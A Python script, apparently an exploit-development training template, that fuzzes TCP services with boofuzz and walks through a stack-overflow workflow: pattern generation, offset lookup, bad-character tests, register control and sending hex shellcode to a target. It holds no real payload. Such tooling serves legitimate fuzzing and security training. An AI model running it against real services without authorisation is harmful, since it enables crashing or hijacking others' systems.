#!/usr/bin/env python3
from __future__ import annotations
from argparse import (
    Namespace as Options,
    ArgumentParser as Parser
)
from typing import (
    TypeVar,
    Generic,
    Union,
    Callable,
    Any
)
from string import (
    ascii_uppercase,
    ascii_lowercase,
    digits
)
from struct import (
    pack,
    unpack
)
from sys import (
    stdout,
    stderr
)
from socket import (
    socket,
    AF_INET,
    SOCK_STREAM
)
from binascii import (
    unhexlify,
    hexlify
)
from threading import Event
from typing.io import IO
from boofuzz import *


_M = TypeVar("_M", bound=Union[Exception, object, str])
_B = TypeVar("_B", bound=Union[str, bytes, list, None])
_C = TypeVar("_C", bound=Union[str, bytes, int, None])
_S = TypeVar("_S", bound=Union[Session, socket, None])


# noinspection PyMethodMayBeStatic,SpellCheckingInspection
class Fuzzer(Generic[_S, _M, _B, _C]):
    usage: str = """\n
    
    * Fuzzing & Debugging Tips *
     
        (i) Linux debugging with GDB:
         gdb -q --pid $(pgrep lin-server) --eval-command 'set follow-fork-mode child';

        (i) Windows debugging with CDB:
         cdb -pn win-server.exe -pd -c "g"
        
        (i) Set windbg as post mortem debugger:
         windbg.exe -I 
    
        (i) Fuzzing input parameter explained:     
         Format: -i (1)<parameter> (2)<value> (3)delimiter (4)fuzzValue (5)fuzzDel
         (1)<The parameter value or second argument> 
         (2)<The delimiter between parameter name and value>
         (3)<Enable fuzzing the value or second argument>
         (4)<Enable fuzzing the delimiter>

    * Fuzzing Process & Examples * 
    
        (1) Fuzz the target to trigger a crash 
         (i) Example using three parameters:
            python fuzz-server.py --fuzz \\
             -d fuzz_db -l fuzz_log \\
             -t 192.168.43.1 -p 65534 \\
             -i "FUZZ" "FUZZ" "" true false \\
             -i "time" "FUZZ" "" false false \\
             -i "debug" "FUZZ" "" false false    
         
         (i) Example skipping 19 test cases starting at 20:
            python fuzz-server.py --fuzz \\
             -d fuzz_db -l fuzz_log --skip 20 \\
             -t 192.168.43.1 -p 65534 \\
             -i "FUZZ" "FUZZ" "" true false \\
                          
        (2) Hex encode the command that crashed the target
          (i) Example of encoding the "debug" command to "6465627567":  
            python fuzz-server.py -th debug
            
        (3) Confirm crash using random pattern of n length
          (i) Example of prepending the "debug" command, generating random pattern of 2000 bytes:
            python fuzz-server.py --confirm \\
            -t 192.168.43.1 -p 65534 \\
            -pre 6465627567 -gp -s 2000
        
        (4) Decode the pattern from overwritten register(s)
          (i) Example of decoding the EIP value of "79413279" to "yA2y":
            python fuzz-server.py -fh 79413279
                
        (5) Locate the offset from the pattern of the overwritten register
          (i) Example of searching the 2000 byte pattern to find the offset 727 of ""yA2y":
              Note: This doesn't include the size of the prepended "debug" bytes!    
            python fuzz-server.py -find -o yA2y \\
            -s 2000 --confirm
        
        (6) Confirm control over registers
          (i) Example of sending "debug" plus 727 bytes of CC padding, followed by AAAAAAAA for the EIP, etc:    
            python fuzz-server.py --confirm \\
            -t 192.168.43.1 -p 65534 \\
            -pre 6465627567 -pad CC -s 727 \\
            -a AAAAAAAA -a BBBBBBBB
            
        (7) Confirm space for shellcode and/or bad characters
          (i) Example of crashing the target with 727 bytes of NOPs plus bytes between 00-FF, excluding 00, 0A, and 0D:
            python fuzz-server.py --confirm \\
            -t 192.168.43.1 -p 65534 -gc \\
            -pre 6465627567 -pad 90 -s 727 -b 000A0D  
            
        (8) Confirm execution of code using NOP padding and hex shellcode
          (i) Example of testing shellcode and prepending 16-NOPs to the payload:
            python fuzz-server.py --confirm \\
            -t 192.168.43.1 -p 65534 \\
            -pad 90 -s 16 -c DEADBEEF...DEADBEEF    
    \n"""

    def __init__(self, opts: Options, **kw):
        self.event: Event = Event()
        self.sock: _S = socket(AF_INET, SOCK_STREAM)
        self.buffSize: int = 4
        self.target: str = "192.168.43.1"
        self.port: int = 65534
        self.session: _S = None
        self.restarts: list = []
        self.dbName: str = "fuzz"
        self.logName: str = "fuzz"
        self.skipCases: int = 0
        self.set(**opts.__dict__).set(**kw)

    """ FUZZING INTERNAL CLASSES """

    class EventCapture(object):
        def __init__(self, *ag, **kw):
            self.params: list = ag
            self.__dict__.update(**kw)

    class RestartEvent(EventHook):
        def __init__(self, callback: Callable, **kw):
            EventHook.__init__(self)
            self.__handlers = [callback]
            self.__dict__.update(**kw)

    """ GENERAL PROPERTIES """

    @property
    def shellcode(self) -> bytes:
        return unhexlify(self.get("code", ""))

    @property
    def remaining(self) -> int:
        left = 0
        try:
            left = len(self.get("input", []))
        except Exception as err:
            self.logError(f"remaining: {err}")
        return left

    @property
    def clsName(self) -> str:
        return self.__class__.__name__

    @property
    def logFile(self) -> IO:
        return open(f"{self.logName}-{self.target}.log", "a+")

    @property
    def database(self) -> str:
        return f"{self.logName}-{self.target}.db"
    
    @property
    def stopped(self) -> bool:
        return self.event.is_set()

    """ GENERAL METHODS """

    def get(self, key: str, *ag, **kw) -> Any:
        return self.__dict__.get(key, *ag, **kw)

    def set(self, **kw) -> Fuzzer:
        self.__dict__.update(**kw)
        return self

    def fromHex(self, value: _B) -> bytes:
        try:
            return unhexlify(self.toString(value).strip())
        except Exception as err:
            self.logError(f"fromHex: {err}")
            return b""

    @staticmethod
    def toString(value: _B) -> str:
        return value.decode() if isinstance(value, bytes) else value

    @staticmethod
    def toBytes(value: _B) -> bytes:
        return value if isinstance(value, bytes) else value.encode()

    def fromHexArray(self, values: list) -> bytes:
        return b"".join([self.fromHex(value) for value in values])

    @staticmethod
    def pack(address: int) -> bytes:
        return pack("<L", address)

    @staticmethod
    def unpack(address: bytes) -> int:
        return unpack(">L", address)[0]

    """ CONFIRMATION METHODS """

    @staticmethod
    def pattern() -> str:
        for x in ascii_uppercase:
            for y in ascii_lowercase:
                for z in digits:
                    yield f"{x}{y}{z}"

    def generatePattern(self, size: int) -> bytes:
        data: list[bytes] = []
        [
            data.append(char.encode())
            for char in self.pattern()
            if len(b"".join(data)) < size
        ]
        return b"".join(data[:size])

    def generateChars(self, exclude: _C = b"") -> bytes:
        exclude = list(
            bytes(list([exclude])) if isinstance(exclude, int)
            else self.toBytes(exclude)
        )
        return bytes([
            idx for idx in range(0x100) if idx not in exclude
        ])

    def findOffset(self, key: str, size: int) -> str:
        pattern = self.generatePattern(size).decode("ascii")
        key = key.strip().encode().decode("ascii")
        result = pattern.find(key)
        if result < 0:
            key = list(key)
            key.reverse()
            key = "".join(key)
            result = pattern.find(key)
        return (
            f"{key} located at {result}" if result >= 0
            else f"Failed to locate {key}"
        )

    @staticmethod
    def getPadding(size: int, byte: _B = 0x90) -> bytes:
        return bytes([byte[0] if isinstance(byte, bytes) else byte]) * size

    @staticmethod
    def toHexAddress(data: int, right: bool = False) -> str:
        address = hex(data).lstrip("0x")
        return (
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )

    def toAddress(self, data: _B, right: bool = False) -> int:
        address = self.toString(data).strip()
        address = str(
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )
        return self.unpack(unhexlify(address))

    def connect(self) -> Fuzzer:
        try:
            self.sock: socket = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.target, self.port))
        except Exception as err:
            raise Exception(f"Connect error: {err}")
        return self

    def send(self, buffer: bytes) -> Fuzzer:
        try:
            self.sock.send(buffer)
        except Exception as err:
            raise Exception(f"Send error: {err}")
        return self

    def recv(self, size: int) -> bytes:
        try:
            return self.sock.recv(size)
        except Exception as err:
            raise Exception(f"Receive error: {err}")

    def close(self) -> Fuzzer:
        try:
            self.sock.close()
        except Exception as err:
            print(f"Close error: {err}")
        return self

    def recvUntil(self, flag: bytes) -> bytes:
        data: bytes = bytes()
        while True:
            try:
                data += self.recv(self.buffSize)
                if flag in data:
                    break
            except Exception as er:
                print(f"Recieve error: {er}")
                break
        return data

    def confirmCrash(self) -> Fuzzer:
        try:
            if self.get("genPattern"):
                self.logInfo(f"Confirming crash pattern size: {self.get('size')}")
                payload = self.fromHexArray(self.get("prependBytes"))
                payload += self.generatePattern(self.get("size"))
                payload += self.fromHexArray(self.get("addBytes"))
                self.logInfo(f"Confirming crash")
                return self.send(payload)
        except Exception as err:
            self.logError(f"confirmCrash: {err}")
        return self

    def confirmCharsSpace(self) -> Fuzzer:
        try:
            if self.get("genChars"):
                self.logInfo(f"Generating character sequence")
                payload = self.fromHexArray(self.get("prependBytes"))
                payload += self.getPadding(
                    self.get("size"),
                    self.fromHex(self.get("paddingChar"))
                )
                payload += self.generateChars(self.fromHex(self.get("exclude")))
                payload += self.fromHexArray(self.get("addBytes"))
                self.logInfo(f"Confirming characters excluding {self.get('exclude')}")
                return self.send(payload)
        except Exception as err:
            self.logError(f"confirmCharsSpace: {err}")
        return self

    def confirmControl(self) -> Fuzzer:
        try:
            self.logInfo(f"Generating payload")
            payload = self.fromHexArray(self.get("prependBytes"))
            payload += self.getPadding(
                self.get("size"),
                self.fromHex(self.get("paddingChar"))
            )
            payload += self.fromHex(self.get("code"))
            payload += self.fromHexArray(self.get("addBytes"))
            self.logInfo(f"Confirming control with {''.join(self.get('addBytes'))}")
            self.send(payload)
        except Exception as err:
            self.logError(f"confirmControl: {err}")
        return self

    def confirmFuzz(self) -> Fuzzer:
        self.logInfo(f"Confirming fuzzed target: {self.target}:{self.port}")
        try:
            if self.get("searchOffset"):
                return self.logInfo(
                    self.findOffset(
                        self.get("offset"),
                        self.get("size")
                    )
                )
            self.logInfo(f"Connecting to target").connect()
            if self.get("genPattern"):
                self.confirmCrash()
            elif self.get("genChars"):
                self.confirmCharsSpace()
            else:
                self.confirmControl()
            self.logInfo(f"Disconnecting from target").close()
        except Exception as err:
            self.logError(f"confirmFuzz: {err}")
        return self

    """ FUZZING METHODS """

    def stop(self) -> Fuzzer:
        if not self.stopped:
            self.logInfo(f"Stopping session.").event.set()
        return self    

    def logOutput(self, message: _M, error: bool = False) -> Fuzzer:
        (stderr if error else stdout).write(f"{message}\n")
        self.logFile.write(f"{message}\n")
        return self

    def logError(self, message: _M) -> Fuzzer:
        return self.logOutput(
            f"[!] ERROR: {self.clsName}.{message}",
            True
        )

    def logInfo(self, message: _M) -> Fuzzer:
        return self.logOutput(
            f"[i] INFO: {message}"
        )

    def restartCallback(self, *ag, **kw) -> bool:
        self.restarts.append(Fuzzer.EventCapture(*ag, **kw))
        self.logInfo(f"Callback received: {len(self.restarts)}")
        return False

    def getSession(self, index: int = 0, **kw) -> Fuzzer:
        try:
            self.logInfo(f"Initializing session.")
            self.session = Session(
                ignore_connection_issues_when_sending_fuzz_data=False,
                check_data_received_each_request=True,
                restart_callbacks=[self.restartCallback],
                ignore_connection_aborted=False,
                reuse_target_connection=False,
                ignore_connection_reset=False,
                receive_data_after_fuzz=True,
                crash_threshold_request=1,
                db_filename=self.database,
                restart_threshold=1,
                index_start=index,
                fuzz_loggers=[
                    FuzzLoggerText(file_handle=self.logFile),
                    FuzzLoggerText(file_handle=stdout),
                ],
                target=Target(
                    connection=TCPSocketConnection(
                        self.target,
                        self.port
                    )
                ),
                **kw
            )
            self.session.on_failure = Fuzzer.RestartEvent(
                callback=self.restartCallback
            )
            self.logInfo(f"Session initialized.")
        except Exception as err:
            self.logError(f"getSession: {err}").stop()
        return self

    def startFuzz(
        self,
        parameter: str = "FUZZ",
        value: str = "FUZZ",
        delimiter: str = "",
        fuzzValue: bool = False,
        fuzzDelimiter: bool = False,
        **kw
    ) -> Fuzzer:
        self.logInfo(f"Starting fuzz: {parameter} {value} {delimiter}")
        try:
            self.getSession(index=self.skipCases, **kw)
            s_initialize(parameter)
            s_string(parameter, fuzzable=fuzzValue)
            s_delim(delimiter, fuzzable=fuzzDelimiter)
            s_string(value, fuzzable=True)
            self.session.connect(s_get(parameter))
            self.session.fuzz()
        except Exception as err:
            self.logError(f"startFuzz: {err}")
        return self

    def fuzzNext(self) -> tuple:
        nextFuzz: tuple = ()
        try:
            if not bool(self.remaining):
                self.stop()
                return nextFuzz
            ag: tuple = self.get("input", []).pop(0)
            nextFuzz = (
                str(ag[0]), str(ag[1]), str(ag[2]),
                bool(str(ag[3]) == "true"),
                bool(str(ag[4]) == "true")
            )
        except Exception as err:
            self.logError(f"fuzzNext: {err}")
            self.stop()
        return nextFuzz

    def fuzz(self, **kw) -> Fuzzer:
        self.logInfo(f"Fuzzing target: {self.target}:{self.port}")
        while not self.stopped:
            try:
                self.startFuzz(*self.fuzzNext(), **kw)
            except KeyboardInterrupt:
                self.logInfo(f"Exit requested.")
                break
            except Exception as err:
                self.logError(f"startFuzz: {err}")
                break
            finally:
                if not bool(self.remaining):
                    self.stop()
                    break
        self.logInfo(f"Fuzzing complete.")
        input("Press any key to exit.")
        return self

    """ MAIN ENTRY POINT """

    @staticmethod
    def main(**kw) -> Fuzzer:
        # FUZZING ARGMENTS
        opts: Parser = Parser(
            description="** Fuzzing template for TCP/IP based applications **"
        )
        opts.add_argument(
            '-hints', '--hints',
            dest='hints',
            default=False,
            action='store_true',
            required=False,
            help='Display hints and tips'
        )
        opts.add_argument(
            '--fuzz',
            dest='fuzzTarget',
            default=False,
            action='store_true',
            required=False,
            help='Fuzz target over TCP/IP'
        )
        opts.add_argument(
            '--confirm',
            default=False,
            action='store_true',
            required=False,
            help='Confirm crash, control, space, bad-characters, or execution'
        )
        opts.add_argument(
            '-t', '--target',
            dest='target',
            default='192.168.43.1',
            type=str,
            required=False,
            help='Target IP address to connect to'
        )
        opts.add_argument(
            '-p', '--port',
            dest='port',
            default=65534,
            type=int,
            required=False,
            help='Target port to connect to'
        )
        opts.add_argument(
            '-l', '--logfile',
            dest='logName',
            default='fuzz',
            type=str,
            required=False,
            help='Logfile base name to log output'
        )
        opts.add_argument(
            '-d', '--database',
            dest='dbName',
            default='fuzz',
            type=str,
            required=False,
            help='Database base file name to log output'
        )
        opts.add_argument(
            '-i', '--input',
            dest='input',
            required=False,
            action='append',
            nargs=5,
            metavar=(
                'parameter',
                'value',
                'delimiter',
                'fuzzValue',
                'fuzzDelimiter'
            ),
            help='Input parameters for fuzzing'
        )
        # CONFIRMATION ARGMENTS
        opts.add_argument(
            '-th', '--to-hex',
            dest='strToHex',
            default="",
            type=str,
            required=False,
            help='Convert a string to a hex and display the output'
        )
        opts.add_argument(
            '-fh', '--from-hex',
            dest='strFromHex',
            default="",
            type=str,
            required=False,
            help='Convert a string to from hex and display the output'
        )
        opts.add_argument(
            '-s', '--size',
            dest='size',
            default=0,
            type=int,
            required=False,
            help='Length of pattern to generate when confirming crash'
        )
        opts.add_argument(
            '-c', '--code',
            dest='code',
            default="",
            type=str,
            required=False,
            help='Hex encoded shellcode to send for confirmation'
        )
        opts.add_argument(
            '-a', '--append-bytes',
            dest='addBytes',
            default=[""],
            required=False,
            action='append',
            help='Hex encoded byte-code to append to shellcode or padding'
        )
        opts.add_argument(
            '-pre', '--prepend-bytes',
            dest='prependBytes',
            default=[""],
            required=False,
            action='append',
            help='Hex encoded byte-code to prepend to shellcode or padding'
        )
        opts.add_argument(
            '-o', '--offset-pattern',
            dest='offset',
            default="",
            type=str,
            required=False,
            help='Pattern to search to for when searching for pattern offset'
        )
        opts.add_argument(
            '-b', '--bad-bytes',
            dest='exclude',
            default="",
            type=str,
            required=False,
            help='Hex encoded bytes to exclude from byte code for bad-char confirmation'
        )
        opts.add_argument(
            '-pad', '--padding',
            dest='paddingChar',
            default="",
            type=str,
            required=False,
            help='Hex encoded byte to prepend as padding characters'
        )
        # CONFIRMATION ACTION ARGMENTS
        opts.add_argument(
            '-find', '--find-offset',
            dest='searchOffset',
            default=False,
            action='store_true',
            required=False,
            help='Search for offset based on pattern size sent during crash confirmation'
        )
        opts.add_argument(
            '-gp', '--generate-pattern',
            dest='genPattern',
            default=False,
            action='store_true',
            required=False,
            help='Generate and send byte pattern to target for crash confirmation'
        )
        opts.add_argument(
            '-gc', '--generate-chars',
            dest='genChars',
            default=False,
            action='store_true',
            required=False,
            help='Generate and append byte sequence 00-FF to confirm bad characters'
        )
        opts.add_argument(
            '-skip', '--skip',
            dest='skipCases',
            type=int,
            default=0,
            action='store',
            required=False,
            help='Skip number of test cases for follow on fuzzing'
        )
        opts: Options = opts.parse_args()
        fuzzer = Fuzzer(opts, **kw)
        if opts.fuzzTarget or opts.confirm:
            return fuzzer.fuzz() if opts.fuzzTarget else fuzzer.confirmFuzz()
        if not (opts.fuzzTarget or opts.confirm):
            if opts.hints:
                fuzzer.logOutput(fuzzer.usage)
            elif opts.strToHex:
                fuzzer.logOutput(fuzzer.toString(
                    hexlify(opts.strToHex.encode())
                ))
            elif opts.strFromHex:
                fuzzer.logOutput(fuzzer.toString(
                    unhexlify(opts.strFromHex.encode())
                ))
        return fuzzer


def main():
    Fuzzer.main()


if __name__ == "__main__":
    main()
